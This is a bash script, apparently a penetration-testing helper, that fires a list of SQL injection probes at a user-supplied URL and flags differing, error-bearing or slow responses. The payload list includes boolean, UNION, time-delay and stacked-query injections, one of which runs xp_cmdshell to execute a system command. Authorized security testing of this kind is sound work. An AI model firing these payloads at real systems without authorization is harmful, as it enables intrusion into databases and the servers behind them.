#!/usr/bin/env bash
# sqli-smoketest.sh — fire a handful of SQLi probes at a URL template, show diffs.
#
# usage:  sqli-smoketest.sh 'http://target/path?q=FUZZ'
# Replace the injection point with the literal string FUZZ.
#
# Only use against systems you have authorization to test.

set -u

URL_T="${1:-}"
if [[ -z "$URL_T" || "$URL_T" != *FUZZ* ]]; then
    echo "usage: $0 'http://target/path?q=FUZZ'"
    exit 1
fi

PAYLOADS=(
    "test"
    "test'"
    "test\""
    "test\\"
    "test' OR '1'='1"
    "test' OR 1=1--"
    "test\" OR 1=1--"
    "test')) OR 1=1--"
    "test' AND 1=2--"
    "test'/**/UNION/**/SELECT/**/NULL--"
    "test'; WAITFOR DELAY '0:0:5'--"
    "test' AND SLEEP(5)--"
    "test' AND pg_sleep(5)--"
    "';EXEC xp_cmdshell('whoami')--"
    "0 OR 1=1"
    "1' AND SUBSTR(sqlite_version(),1,1)='3'--"
)

urlencode() { python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }

baseline_url="${URL_T//FUZZ/$(urlencode "test")}"
echo "[*] baseline: $baseline_url"
start=$(date +%s)
BASE=$(curl -sk -o /tmp/sqli_base -w "%{http_code} %{size_download} %{time_total}" "$baseline_url")
echo "    $BASE"
echo

for p in "${PAYLOADS[@]}"; do
    enc=$(urlencode "$p")
    url="${URL_T//FUZZ/$enc}"
    out=$(curl -sk -o /tmp/sqli_resp -w "%{http_code} %{size_download} %{time_total}" "$url")
    read -r code size time <<<"$out"
    diff_hint=""
    if ! diff -q /tmp/sqli_base /tmp/sqli_resp >/dev/null 2>&1; then
        diff_hint=" DIFF"
    fi
    # Flag likely-SQLi responses
    note=""
    if grep -qiE "sql(ite|_|)|syntax error|unclosed|ORA-|mysql|near \"" /tmp/sqli_resp; then
        note+=" [sql-err]"
    fi
    tfloat=$(awk "BEGIN{print ($time>3)?1:0}")
    if [[ "$tfloat" == "1" ]]; then
        note+=" [slow]"
    fi
    printf "  %-45s  %s %sB  %-6s%s%s\n" "$p" "$code" "$size" "$time" "$diff_hint" "$note"
done

echo
echo "[*] done — look for DIFF or [sql-err] rows, and [slow] (time-based)."
